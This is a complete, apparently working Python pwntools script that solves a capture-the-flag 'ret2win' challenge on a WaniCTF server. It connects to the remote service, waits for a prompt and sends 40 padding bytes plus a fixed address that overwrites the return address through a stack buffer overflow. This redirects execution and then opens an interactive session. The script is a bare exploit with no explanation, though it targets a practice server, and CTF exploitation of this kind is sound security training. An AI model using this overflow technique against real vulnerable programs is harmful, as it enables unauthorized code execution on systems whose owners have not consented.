from pwn import *

io = remote('ret2win-pwn.wanictf.org', 9003)

io.recvuntil(b'bytes) > ')
payload = b'i'*40 + p64(0x0000000000401369)
io.sendline(payload)
io.interactive()